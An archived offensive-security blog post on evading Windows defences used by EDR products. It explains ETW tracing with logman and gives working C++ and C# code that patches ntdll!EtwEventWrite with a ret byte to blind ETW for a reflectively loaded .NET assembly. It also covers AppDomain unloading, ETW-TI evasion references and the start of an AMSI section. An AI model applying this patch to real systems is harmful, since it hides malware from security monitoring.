@@ -1,0 +1,481 @@
+# https://pre.empt.blog/post/maelstrom-6/
+
+<!DOCTYPE html><html lang="en" class="dark">
+  <body>
+    <div id="root"><div class="min-h-screen flex flex-col"><main class="flex-1"><div class="mx-auto w-full max-w-full" style="padding: 1.5rem;"><div style="max-width: 1200px; margin: 0px auto;"><p><img src="https://pre.empt.blog/static/images/maelstrom-6-1.gif" alt="dev"></p>
+<h2>Introduction</h2>
+<p>Last week we looked at three mechanisms which Event Detection and Response (EDR) programs can use to build suspicion and prevent the operation of a C2's implant. However there are mechanisms within Windows itself which can prevent the full function of a C2 implant, acting as a potent benefit to the defender and a worthy obstacle to the C2 operator.</p>
+<p>As we mentioned last week, it can be surprisingly easy to get a functioning implant developed, and it can feel odd at times which behaviours and actions can be performed without issue and which invite undue attention. This is because not all actions are necessarily malicious and a defensive mechanism which prevents the use of the computer isn't helpful for productivity.</p>
+<p>Over time, Microsoft has enhanced its built-in protections and opened these up to third party applications. EDR solutions are increasingly including these mechanisms and their telemetry, meaning that a contemporary C2 implant must either evade or negate these protections.</p>
+<p>The second of two parts, this episode will look at two key Windows protections used by contemporary EDRs: ETW and AMSI.</p>
+<h3>Objectives</h3>
+<p>This post will cover:</p>
+<ul>
+<li>Reviewing Event Tracing for Windows</li>
+<li>Where information is gathered</li>
+<li>How events can be manipulated</li>
+<li>How ETW TI can be evaded</li>
+<li>Reviewing Anti-Malware Scan Interface</li>
+<li>What detection looks like</li>
+<li>How AMSI has historically been bypassed</li>
+<li>How AMSI may continue to be bypassed</li>
+</ul>
+<p>At the end of this second blog on endpoint protection, we will have looked at the five most prominent ways that modern EDRs can protect against malicious implants, and explored ways these protections can by bypassed. We will have gone from having an implant that can serve as a proof of concept with caveats to an implant which can act as part of our C2 and execute malicious traffic without detection.</p>
+<p>To repeat the same caveat we have made in each of these blogs, the code from these posts is purely illustrative. There are thousands of potential detections and missteps which can pique an EDRs interest in an implant, and it would be remiss of us to release an implant without any flaws to the world. Plus, spaghetti code.</p>
+<h3>Important Concepts</h3>
+<h4>Event Tracing for Windows</h4>
+<p>Before we look at how Event Tracing for Windows (ETW) can be leveraged for its Threat Intelligence facilities, we should first look at ETW itself - what is it, how does it work, and what is it for.</p>
+<p>First introduced with <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/event-tracing-for-windows-simplified">Windows 2000</a>, ETW was originally intended to offer detailed user and kernel logging which can be dynamically enabled or disabled without needing to restart the targeted process. This was originally and remains predominantly aimed at application debugging and optimisation. The early use of buffers and message queues, reminiscent of newer Web technologies such as <a href="https://kafka.apache.org/">Apache Kafka</a>, aims to limit the system impact of tracing (logging) sessions - helpful when trying to debug the system impact of your process itself.</p>
+<p>The core structure of ETW has barely changed since Windows 2000, although the process of sending and receiving logs has been overhauled a number of times to make it easier for third-party programs to integrate with ETW.</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing">Microsoft's documentation</a> describes the ETW architecture as the following:</p>
+<blockquote>
+<p>The Event Tracing API is broken into three distinct components:</p>
+</blockquote>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers">Controllers</a>, which start and stop an event tracing session and enable providers</li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers">Providers</a>, which provide the events</li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers">Consumers</a>, which consume the events</li>
+</ul>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-2.png" alt=""></p>
+<p>Controllers are limited to users with admin rights, with some caveats.</p>
+<p>Along-side the callbacks, Event Tracing for Windows Threat Intelligence provides tracing from the kernel and allows these traces to be consumed in various ways.</p>
+<h3>Working with ETW</h3>
+<p>Within Windows, the <code>logman</code> binary exists which can be considered a Controller due to its functionality:</p>
+<pre><code class="language-plaintext">
+Verbs:
+  create                        Create a new data collector.
+  query                         Query data collector properties. If no name is given all data collectors are listed.
+  start                         Start an existing data collector and set the begin time to manual.
+  stop                          Stop an existing data collector and set the end time to manual.
+  delete                        Delete an existing data collector.
+  update                        Update an existing data collector's properties.
+  import                        Import a data collector set from an XML file.
+  export                        Export a data collector set to an XML file.
+
+</code></pre>
+<p><strong>The Providers</strong></p>
+<p>There's a huge list of the default providers available; while <a href="https://gist.github.com/guitarrapc/35a94b908bad677a7310">there are lists available</a> for these, we can just list all the providers on the systems with <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/logman">logman</a>:</p>
+<pre><code class="language-plaintext">
+undefined
+logman query providers
+
+</code></pre>
+<p>Running this will produce a long list of providers. We will focus on <code>Microsoft-Windows-DotNETRuntime</code> for now.</p>
+<p>Running it again:</p>
+<pre><code class="language-plaintext">
+undefined
+logman query providers Microsoft-Windows-DotNETRuntime
+
+</code></pre>
+<p>Resulting in:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-3.PNG" alt=""></p>
+<p>Alternatively, for those more visually inclined, <a href="https://github.com/zodiacon/EtwExplorer">EtwExplorer</a> by <a href="https://github.com/zodiacon">Pavel Yosifovich (zodiacon)</a> was developed to explore ETW within a GUI.</p>
+<p>Here is an example of the same provider from the logman query:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-4.PNG" alt=""></p>
+<p><strong>Sample Code</strong></p>
+<p>To play with ETW, we will try to detect a reflective <code>Assembly.Load</code> of a slim loader loading a proof-of-concept loadee executable:</p>
+<p>The Loader:</p>
+<pre><code class="language-csharp">
+<span class="pl-k">using</span> <span class="pl-en">System</span>.<span class="pl-en">Reflection</span>;
+
+<span class="pl-k">namespace</span> <span class="pl-en">Loader</span>
+{
+    <span class="pl-k">internal</span> <span class="pl-k">class</span> <span class="pl-en">Program</span>
+    {
+        <span class="pl-k">static</span> <span class="pl-k">void</span> <span class="pl-en">Main</span>(<span class="pl-k">string</span>[] <span class="pl-en">args</span>)
+        {
+            <span class="pl-smi">Assembly</span> <span class="pl-smi">assembly</span> <span class="pl-k">=</span> <span class="pl-smi">Assembly</span>.<span class="pl-en">LoadFrom</span>(<span class="pl-s"><span class="pl-pds">@"</span>C:\Users\mez0\Desktop\Loader\Example\bin\Debug\Example.exe<span class="pl-pds">"</span></span>);
+            <span class="pl-smi">assembly</span>.<span class="pl-smi">EntryPoint</span>.<span class="pl-en">Invoke</span>(<span class="pl-c1">null</span>, <span class="pl-c1">null</span>);
+        }
+    }
+}
+
+</code></pre>
+<p>Then our Loadee, "Example.exe", which we will compile and the loader will access via reflection:</p>
+<pre><code class="language-csharp">
+<span class="pl-k">using</span> <span class="pl-en">System</span>;
+
+<span class="pl-k">namespace</span> <span class="pl-en">Example</span>
+{
+    <span class="pl-k">internal</span> <span class="pl-k">class</span> <span class="pl-en">Program</span>
+    {
+        <span class="pl-k">static</span> <span class="pl-k">void</span> <span class="pl-en">Main</span>()
+        {
+            <span class="pl-smi">Console</span>.<span class="pl-en">WriteLine</span>(<span class="pl-s"><span class="pl-pds">"</span>--&gt; Hello From Example.exe &lt;--<span class="pl-pds">"</span></span>);
+        }
+    }
+}
+
+</code></pre>
+<p>The Loader will call <code>Assembly.LoadFrom</code> on the Loadee, which simply prints to the screen. When it runs, the Loadee is displayed:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-5.PNG" alt=""></p>
+<p><strong>Configuring a Controller</strong></p>
+<p>In order to see what ETW is doing, we need a controller to create, start, and stop our trace. For this, we can again use <code>logman</code>.</p>
+<p>First, we create our trace, providing the name of our session ("<code>pre.empt.etw</code>") and the <code>-ets</code> flag which will send the commands directly to our event trace without scheduling or saving them:</p>
+<pre><code class="language-plaintext">logman create trace pre.empt.etw -ets
+</code></pre>
+<p>Running this should ideally return the following:</p>
+<pre><code class="language-plaintext">The command completed successfully.
+</code></pre>
+<p>With our trace created, we can now query it to get its status and configuration using the following command:</p>
+<pre><code class="language-plaintext">logman query pre.empt.etw -ets
+</code></pre>
+<p>This should return something like this:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-6.PNG" alt=""></p>
+<p>Note the output location, which is based on the name of our created trace. We will need this to open our trace within Event Viewer:</p>
+<pre><code class="language-plaintext">C:\Users\mez0\pre.empt.etw.etl
+</code></pre>
+<p>Once that's done, our new provider can be added to the controller:</p>
+<pre><code class="language-plaintext">logman update pre.empt.etw -p Microsoft-Windows-DotNETRuntime 0x2038 -ets
+</code></pre>
+<p><code>0x2038</code> is the bitmask of the events shown in <a href="https://blog.f-secure.com/detecting-malicious-use-of-net-part-2/">Detecting Malicious Use of .NET – Part 2</a>:</p>
+<pre><code class="language-plaintext">LoaderKeyword,JitKeyword,NGenKeyword,InteropKeyword
+</code></pre>
+<p>Querying it again:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-7.PNG" alt=""></p>
+<p>Now that its setup, the assembly is run again and the <code>etl</code> file is opened in Event Viewer:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-8.PNG" alt=""></p>
+<p>Where <code>EventId</code> 152 is:</p>
+<pre><code class="language-plaintext">
+LoaderModuleLoad
+
+</code></pre>
+<p>And then 145 (<code>MethodJittingStarted_V1</code>):</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-9.PNG" alt=""></p>
+<p>To stop this, just run:</p>
+<pre><code class="language-plaintext">
+logman stop pre.empt.etw -ets
+
+</code></pre>
+<p><strong>Tampering with ETW</strong></p>
+<p>In <a href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/">Hiding your .NET ETW</a> by <a href="https://www.mdsec.co.uk/">MDSec</a>, <a href="https://twitter.com/_xpn_">xpn</a> states:</p>
+<blockquote>
+<p>To neuter this function we will use the same <strong>ret 14h</strong> opcode bytes of <strong>c21400</strong> and apply them to the beginning of the function</p>
+</blockquote>
+<p>Then provides example code:</p>
+<pre><code class="language-cpp">
+<span class="pl-c">// Get the EventWrite function</span>
+<span class="pl-k">void</span> *eventWrite = GetProcAddress(LoadLibraryA(<span class="pl-s"><span class="pl-pds">"</span>ntdll<span class="pl-pds">"</span></span>), <span class="pl-s"><span class="pl-pds">"</span>EtwEventWrite<span class="pl-pds">"</span></span>);
+
+<span class="pl-c">// Allow writing to page</span>
+<span class="pl-en">VirtualProtect</span>(eventWrite, <span class="pl-c1">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProt);
+
+<span class="pl-c">// Patch with "ret 14" on x86</span>
+<span class="pl-en">memcpy</span>(eventWrite, <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\xc2\x14\x00\x00</span><span class="pl-pds">"</span></span>, <span class="pl-c1">4</span>);
+
+<span class="pl-c">// Return memory to original protection</span>
+<span class="pl-en">VirtualProtect</span>(eventWrite, <span class="pl-c1">4</span>, oldProt, &amp;oldOldProt);
+
+</code></pre>
+<p>Lets update the <code>Loader</code>:</p>
+<pre><code class="language-csharp">
+<span class="pl-k">using</span> <span class="pl-en">System</span>;
+<span class="pl-k">using</span> <span class="pl-en">System</span>.<span class="pl-en">Reflection</span>;
+<span class="pl-k">using</span> <span class="pl-en">System</span>.<span class="pl-en">Runtime</span>.<span class="pl-en">InteropServices</span>;
+
+<span class="pl-k">namespace</span> <span class="pl-en">Loader</span>
+{
+    <span class="pl-k">internal</span> <span class="pl-k">class</span> <span class="pl-en">Program</span>
+    {
+        [<span class="pl-en">DllImport</span>(<span class="pl-s"><span class="pl-pds">"</span>kernel32<span class="pl-pds">"</span></span>)]
+        <span class="pl-k">private</span> <span class="pl-k">static</span> <span class="pl-k">extern</span> <span class="pl-en">IntPtr</span> <span class="pl-en">GetProcAddress</span>(<span class="pl-en">IntPtr</span> <span class="pl-en">hModule</span>, <span class="pl-k">string</span> <span class="pl-en">procName</span>);
+
+        [<span class="pl-en">DllImport</span>(<span class="pl-s"><span class="pl-pds">"</span>kernel32<span class="pl-pds">"</span></span>)]
+        <span class="pl-k">private</span> <span class="pl-k">static</span> <span class="pl-k">extern</span> <span class="pl-en">IntPtr</span> <span class="pl-en">LoadLibrary</span>(<span class="pl-k">string</span> <span class="pl-en">name</span>);
+
+        [<span class="pl-en">DllImport</span>(<span class="pl-s"><span class="pl-pds">"</span>kernel32<span class="pl-pds">"</span></span>)]
+        <span class="pl-k">private</span> <span class="pl-k">static</span> <span class="pl-k">extern</span> <span class="pl-k">bool</span> <span class="pl-en">VirtualProtect</span>(<span class="pl-en">IntPtr</span> <span class="pl-en">lpAddress</span>, <span class="pl-en">UIntPtr</span> <span class="pl-en">dwSize</span>, <span class="pl-k">uint</span> <span class="pl-en">flNewProtect</span>, <span class="pl-k">out</span> <span class="pl-k">uint</span> <span class="pl-en">lpflOldProtect</span>);
+
+        <span class="pl-k">public</span> <span class="pl-k">static</span> <span class="pl-k">void</span> <span class="pl-en">PatchEtw</span>()
+        {
+            <span class="pl-smi">IntPtr</span> <span class="pl-smi">hNtdll</span> <span class="pl-k">=</span> <span class="pl-en">LoadLibrary</span>(<span class="pl-s"><span class="pl-pds">"</span>ntdll.dll<span class="pl-pds">"</span></span>);
+            <span class="pl-smi">IntPtr</span> <span class="pl-smi">pEtwEventWrite</span> <span class="pl-k">=</span> <span class="pl-en">GetProcAddress</span>(<span class="pl-smi">hNtdll</span>, <span class="pl-s"><span class="pl-pds">"</span>EtwEventWrite<span class="pl-pds">"</span></span>);
+
+            <span class="pl-k">byte</span>[] <span class="pl-smi">patch</span> <span class="pl-k">=</span> { <span class="pl-c1">0xc3</span> };
+
+            <span class="pl-smi">_</span> <span class="pl-k">=</span> <span class="pl-en">VirtualProtect</span>(<span class="pl-smi">pEtwEventWrite</span>, (<span class="pl-en">UIntPtr</span>)<span class="pl-smi">patch</span>.<span class="pl-smi">Length</span>, <span class="pl-c1">0x40</span>, <span class="pl-k">out</span> <span class="pl-k">uint</span> <span class="pl-en">oldProtect</span>);
+
+            <span class="pl-smi">Marshal</span>.<span class="pl-en">Copy</span>(<span class="pl-smi">patch</span>, <span class="pl-c1">0</span>, <span class="pl-smi">pEtwEventWrite</span>, <span class="pl-smi">patch</span>.<span class="pl-smi">Length</span>);
+
+            <span class="pl-smi">_</span> <span class="pl-k">=</span> <span class="pl-en">VirtualProtect</span>(<span class="pl-smi">pEtwEventWrite</span>, (<span class="pl-en">UIntPtr</span>)<span class="pl-smi">patch</span>.<span class="pl-smi">Length</span>, <span class="pl-smi">oldProtect</span>, <span class="pl-k">out</span> <span class="pl-k">uint</span> <span class="pl-en">_</span>);
+        }
+
+        <span class="pl-k">private</span> <span class="pl-k">static</span> <span class="pl-k">void</span> <span class="pl-en">Main</span>(<span class="pl-k">string</span>[] <span class="pl-en">args</span>)
+        {
+            <span class="pl-smi">Console</span>.<span class="pl-en">WriteLine</span>(<span class="pl-s"><span class="pl-pds">"</span>Inspect the AppDomains, then press any key...<span class="pl-pds">"</span></span>);
+            <span class="pl-smi">Console</span>.<span class="pl-en">ReadLine</span>();
+
+            <span class="pl-en">PatchEtw</span>();
+
+            <span class="pl-smi">Console</span>.<span class="pl-en">WriteLine</span>(<span class="pl-s"><span class="pl-pds">"</span>ETW is patched! Recheck then press any key...<span class="pl-pds">"</span></span>);
+            <span class="pl-smi">Console</span>.<span class="pl-en">ReadLine</span>();
+
+            <span class="pl-smi">Assembly</span> <span class="pl-smi">assembly</span> <span class="pl-k">=</span> <span class="pl-smi">Assembly</span>.<span class="pl-en">LoadFrom</span>(<span class="pl-s"><span class="pl-pds">@"</span>C:\Users\mez0\Desktop\Loader\Example\bin\Debug\Example.exe<span class="pl-pds">"</span></span>);
+            <span class="pl-smi">assembly</span>.<span class="pl-smi">EntryPoint</span>.<span class="pl-en">Invoke</span>(<span class="pl-c1">null</span>, <span class="pl-c1">null</span>);
+        }
+    }
+}
+
+</code></pre>
+<p>This has now been converted to a <code>x64</code> project, and the following function has been added:</p>
+<pre><code class="language-csharp">
+<span class="pl-k">public</span> <span class="pl-k">static</span> <span class="pl-k">void</span> <span class="pl-en">PatchEtw</span>()
+{
+    <span class="pl-smi">IntPtr</span> <span class="pl-smi">hNtdll</span> <span class="pl-k">=</span> <span class="pl-en">LoadLibrary</span>(<span class="pl-s"><span class="pl-pds">"</span>ntdll.dll<span class="pl-pds">"</span></span>);
+    <span class="pl-smi">IntPtr</span> <span class="pl-smi">pEtwEventWrite</span> <span class="pl-k">=</span> <span class="pl-en">GetProcAddress</span>(<span class="pl-smi">hNtdll</span>, <span class="pl-s"><span class="pl-pds">"</span>EtwEventWrite<span class="pl-pds">"</span></span>);
+
+    <span class="pl-k">byte</span>[] <span class="pl-smi">patch</span> <span class="pl-k">=</span> { <span class="pl-c1">0xc3</span> };
+
+    <span class="pl-smi">_</span> <span class="pl-k">=</span> <span class="pl-en">VirtualProtect</span>(<span class="pl-smi">pEtwEventWrite</span>, (<span class="pl-en">UIntPtr</span>)<span class="pl-smi">patch</span>.<span class="pl-smi">Length</span>, <span class="pl-c1">0x40</span>, <span class="pl-k">out</span> <span class="pl-k">uint</span> <span class="pl-en">oldProtect</span>);
+
+    <span class="pl-smi">Marshal</span>.<span class="pl-en">Copy</span>(<span class="pl-smi">patch</span>, <span class="pl-c1">0</span>, <span class="pl-smi">pEtwEventWrite</span>, <span class="pl-smi">patch</span>.<span class="pl-smi">Length</span>);
+
+    <span class="pl-smi">_</span> <span class="pl-k">=</span> <span class="pl-en">VirtualProtect</span>(<span class="pl-smi">pEtwEventWrite</span>, (<span class="pl-en">UIntPtr</span>)<span class="pl-smi">patch</span>.<span class="pl-smi">Length</span>, <span class="pl-smi">oldProtect</span>, <span class="pl-k">out</span> <span class="pl-k">uint</span> <span class="pl-en">_</span>);
+}
+
+</code></pre>
+<p>This follows the logic set out by xpn, and has a <code>0xc3</code>, <code>ret</code>, set on the <code>NTDLL!EtwEventWrite</code> instruction.</p>
+<p>Before the patch:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-10.PNG" alt=""></p>
+<p>Then after the patch:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-11.PNG" alt=""></p>
+<p>So, the big question, does this matter to an actual ETW Event Tracing session?</p>
+<p>Setting it back up:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-12.PNG" alt=""></p>
+<p>The answer: <em>kinda</em>.</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-13.PNG" alt=""></p>
+<p>There is no reference to the Example.exe like there used to be. However, as the Loader first ran, <em>then</em> patched ETW, there are obviously still events for it from before the patch:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-14.PNG" alt=""></p>
+<p>When combined with other heuristics, this can still be enough to act as an indicator of compromise - for instance, an EDR which enabled ETW then identifies a sudden halt of events for a process could still flag this as suspicious if the process can still be seen to be running.</p>
+<p><strong>Repairing ETW</strong></p>
+<p>If memory is being patched, is probably best to un-patch it once its done with. In this instance, <code>0xc3</code> becomes <code>0x4c</code>:</p>
+<pre><code class="language-cpp">
+byte[] breakEtw = { <span class="pl-c1">0xc3</span> };
+byte[] repairEtw = { <span class="pl-c1">0x4c</span> };
+
+</code></pre>
+<p>This is easy enough, it's just a call to the same function with a different byte value. The next thing, in the case of .NET, is to unload the assembly. This is a bit more fiddly but is achievable. We were able to solve this using:</p>
+<ul>
+<li><a href="https://stackoverflow.com/a/13355702">How to Load an Assembly to AppDomain with all references recursively?</a></li>
+<li><a href="https://rastamouse.me/net-reflection-and-disposable-appdomains/">.NET Reflection and Disposable AppDomains</a></li>
+</ul>
+<p>First thing, create an <code>AppDomain</code>:</p>
+<pre><code class="language-csharp">
+<span class="pl-smi">AppDomain</span> <span class="pl-smi">appDomain</span> <span class="pl-k">=</span> <span class="pl-smi">AppDomain</span>.<span class="pl-en">CreateDomain</span>(<span class="pl-smi">Guid</span>.<span class="pl-en">NewGuid</span>().<span class="pl-en">ToString</span>());
+
+</code></pre>
+<p>Now, consider this from <a href="https://www.broes.nl/2012/09/assembly-load-and-filenotfoundexception/">Assembly.Load and FileNotFoundException</a>:</p>
+<blockquote>
+<p>AppDomain.Load returns an Assembly and that's where all goes wrong. Two AppDomains can't just throw stuff at each other. The entire reason AppDomains exist is to be able to "sandbox" certain functionality within one application. Communication between AppDomains happens (almost) transparently to the user (the programmer…) using channels and proxies, but not entirely. You need to be aware that you can either pass objects by value (they need to <a href="http://msdn.microsoft.com/en-us/library/h8f0y3fc(VS.100).aspx">implement <strong>ISerialize</strong> or be declared <strong>Serializable</strong></a>) to another AppDomain, or by reference, in which case the class needs to extend <a href="http://msdn.microsoft.com/en-us/library/system.marshalbyrefobject(VS.100).aspx">MarshalByRefObj</a>.</p>
+</blockquote>
+<p>The proposed solution is to use a class which inherits from <code>MarshalByRefObject</code>:</p>
+<pre><code class="language-csharp">
+<span class="pl-k">public</span> <span class="pl-k">class</span> <span class="pl-en">Proxy</span> : <span class="pl-en">MarshalByRefObject</span>
+{
+    <span class="pl-k">public</span> <span class="pl-en">Boolean</span> <span class="pl-en">InvokeAssembly</span>(<span class="pl-k">byte</span>[] <span class="pl-en">bytes</span>)
+    {
+        <span class="pl-smi">try</span>
+        {
+            <span class="pl-smi">Assembly</span> <span class="pl-smi">assembly</span> <span class="pl-k">=</span> <span class="pl-smi">Assembly</span>.<span class="pl-en">Load</span>(<span class="pl-smi">bytes</span>);
+            <span class="pl-smi">assembly</span>.<span class="pl-smi">EntryPoint</span>.<span class="pl-en">Invoke</span>(<span class="pl-c1">null</span>, <span class="pl-c1">null</span>);
+            <span class="pl-smi">return</span> <span class="pl-c1">true</span>;
+        }
+        <span class="pl-en">catch</span> (<span class="pl-smi">Exception</span>)
+        {
+            <span class="pl-smi">return</span> <span class="pl-c1">false</span>;
+        }
+    }
+}
+
+</code></pre>
+<p>Which can then be used to invoke the assembly from <code>bytes</code>:</p>
+<pre><code class="language-csharp">
+<span class="pl-smi">Proxy</span> <span class="pl-smi">proxy</span> <span class="pl-k">=</span> (<span class="pl-en">Proxy</span>)<span class="pl-smi">appDomain</span>.<span class="pl-en">CreateInstanceAndUnwrap</span>(<span class="pl-k">typeof</span>(<span class="pl-en">Proxy</span>).<span class="pl-smi">Assembly</span>.<span class="pl-smi">FullName</span>, <span class="pl-k">typeof</span>(<span class="pl-en">Proxy</span>).<span class="pl-smi">FullName</span>);
+<span class="pl-smi">proxy</span>.<span class="pl-en">InvokeAssembly</span>(<span class="pl-smi">File</span>.<span class="pl-en">ReadAllBytes</span>(<span class="pl-s"><span class="pl-pds">@"</span>C:\Users\mez0\Desktop\Loader\Example\bin\x64\Debug\Example.exe<span class="pl-pds">"</span></span>));
+
+</code></pre>
+<p>And then unload it:</p>
+<pre><code class="language-csharp">
+<span class="pl-smi">AppDomain</span>.<span class="pl-en">Unload</span>(<span class="pl-smi">appDomain</span>);
+
+</code></pre>
+<p>Before moving away from this topic, an honourable mention is: <a href="https://blog.redxorblue.com/2021/05/assemblylie-using-transactional-ntfs.html">Assembly.Lie – Using Transactional NTFS and API Hooking to Trick the CLR into Loading Your Code "From Disk"</a>. This will not be discussed here, but is worth considering if operating from a .NET C2.</p>
+<h4>ETW: Threat Intelligence</h4>
+<p>ETW provides a lot of tracing. However, there's a subsection of ETW that endpoint protection vendors take a lot of information from; namely solutions such as <a href="https://docs.microsoft.com/en-us/defender-for-identity/what-is">Microsoft Defender for Identity</a> make heavy use of this, but it is: *Event Tracing for Windows Threat Intelligence.</p>
+<p>The following screenshot shows the capabilities of ETW TI:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-15.PNG" alt=""></p>
+<p>Memory/process/thread manipulation, driver events, all sorts. As more and more vendors get around to implementing this, visibility into endpoint becomes a lot clearer.</p>
+<p>This is a huge topic and we won't cover it here, so here are some great references:</p>
+<ul>
+<li><a href="https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider">Data Only Attack: Neutralizing EtwTi Provider</a></li>
+<li><a href="https://undev.ninja/introduction-to-threat-intelligence-etw/">Introduction to Threat Intelligence ETW</a></li>
+<li><a href="https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa">Adventures in Dynamic Evasion</a></li>
+<li><a href="https://github.com/repnz/etw-providers-docs/blob/master/Manifests-Win10-17134/Microsoft-Windows-Threat-Intelligence.xml">Microsoft-Windows-Threat-Intelligence.xml</a></li>
+<li><a href="https://blog.redbluepurple.io/windows-security-research/kernel-tracing-injection-detection">Detecting process injection with ETW</a></li>
+<li><a href="https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection">Bypassing EDR real-time injection detection logic</a></li>
+</ul>
+<h4>ETWTi identifying Process Injection</h4>
+<p>As an example, the following screenshot shows <a href="https://mez0.cc/projects/preempt/">PreEmpt</a> detecting Maelstrom reflectively loading the DLL:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-16.png" alt=""></p>
+<p>On the left, maelstrom was executed. Then, on the right, PreEmpt has received an even containing all the information on the impacted memory region. Below is the full JSON:</p>
+<pre><code class="language-json">
+{
+  <span class="pl-ent">"data"</span>: {
+    <span class="pl-ent">"allocation"</span>: <span class="pl-s"><span class="pl-pds">"</span>0x3000<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"protectType"</span>: <span class="pl-s"><span class="pl-pds">"</span>0x1d0000<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"protection"</span>: <span class="pl-s"><span class="pl-pds">"</span>0x40<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"regionsize"</span>: <span class="pl-s"><span class="pl-pds">"</span>73728<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"source_name"</span>: <span class="pl-s"><span class="pl-pds">"</span>C:<span class="pl-cce">\\</span>Users<span class="pl-cce">\\</span>admin<span class="pl-cce">\\</span>Desktop<span class="pl-cce">\\</span>maelstrom.unsafe.x64.exe<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"source_pid"</span>: <span class="pl-s"><span class="pl-pds">"</span>9708<span class="pl-pds">"</span></span>
+  },
+  <span class="pl-ent">"id"</span>: <span class="pl-s"><span class="pl-pds">"</span>cd27e5a5-df06-4859-96f0-d0b207d21ebf<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"reason"</span>: <span class="pl-s"><span class="pl-pds">"</span>Malicious Activity Detected<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"task"</span>: <span class="pl-s"><span class="pl-pds">"</span>EtwTi Process Injection<span class="pl-pds">"</span></span>,
+  <span class="pl-ent">"time"</span>: <span class="pl-s"><span class="pl-pds">"</span>Tue May  3 19:34:33 2022<span class="pl-pds">"</span></span>
+}
+
+</code></pre>
+<h4>Things to Consider</h4>
+<p>When working with an EDR that makes use of ETWTi, remember that memory alterations, process/thread creations, etc; will all be digested. However, not all events will create a prevention/action, but the information will be logged. This is why we avoid the Twitter trope of:</p>
+<p>As shown in <a href="https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection">Bypassing EDR real-time injection detection logic</a>, this logic <em>can</em> be bypassed if the detection logic is weak. In the case of <a href="https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection#driploader">DripLoader</a>, this bypasses detection by slowly adding more and more data to the region. As described in the blog, DripLoader avoids the ETWTi Memory Allocation alert by:</p>
+<blockquote>
+<ul>
+<li>using the most risky APIs possible like <code>NtAllocateVirtualMemory</code> and <code>NtCreateThreadEx</code></li>
+<li>blending in with call arguments to create events that vendors are forced to drop or log\&amp;ignore due to volume</li>
+<li>avoiding multi-event correlation by introducing delays</li>
+</ul>
+</blockquote>
+<p>Finally, for defenders, this is clearly a valuable interface, and one which EDRs are increasingly seeking to include. While not all agents currently gather ETW TI, <a href="https://github.com/mandiant/SilkETW">mandiant's SilkETW</a> is a quick way to include ETW within an ELK SOC.</p>
+<h3>Antimalware Scan Interface (AMSI)</h3>
+<p>From <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Antimalware Scan Interface (AMSI)</a>:</p>
+<blockquote>
+<p>The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.</p>
+<p>AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.</p>
+</blockquote>
+<p>For context, here is a diagram of the AMSI Architecture:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-17.jpg" alt=""></p>
+<p>With script-based malware, it can be easily obfuscated. However, AMSI allows developers to scan the final buffer because, eventually, the code must de-obfuscate. <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps">How the Antimalware Scan Interface (AMSI) helps you defend against malware</a> details this process very well with multiple examples.</p>
+<p>Essentially, AMSI is an interface exposed by Microsoft which allows developers to register a provider, and use the functionality exposed. Traditionally, a DLL would be registered as seen in <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience">Developer audience, and sample code</a>. As for the functions exposed:</p>
